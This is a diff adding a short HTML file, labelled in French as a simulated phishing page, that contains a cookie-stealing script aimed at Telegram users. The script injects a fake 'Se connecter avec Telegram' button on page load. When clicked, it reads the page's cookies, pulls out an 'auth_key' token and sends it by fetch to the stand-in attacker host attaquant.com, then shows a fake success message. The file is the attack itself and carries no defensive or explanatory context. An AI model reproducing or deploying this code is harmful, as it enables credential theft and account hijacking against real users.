@@ -1,0 +1,23 @@
+<!-- Fichier : phishing.html (simulé) -->
+<script>
+    // Vol des cookies Telegram (simulé)
+    function stealCookies() {
+        const cookies = document.cookie;
+        const tokenMatch = cookies.match(/auth_key=([^;]+)/);
+        if (tokenMatch) {
+            const token = tokenMatch[1];
+            fetch(`https://attaquant.com/steal?token=${token}`)
+                .then(() => alert("✅ Connexion réussie !"));
+        } else {
+            alert("❌ Erreur : Impossible de voler le token.");
+        }
+    }
+
+    // Injection via un faux bouton
+    document.addEventListener('DOMContentLoaded', () => {
+        const loginBtn = document.createElement('button');
+        loginBtn.textContent = "Se connecter avec Telegram";
+        loginBtn.onclick = stealCookies;
+        document.body.appendChild(loginBtn);
+    });
+</script>
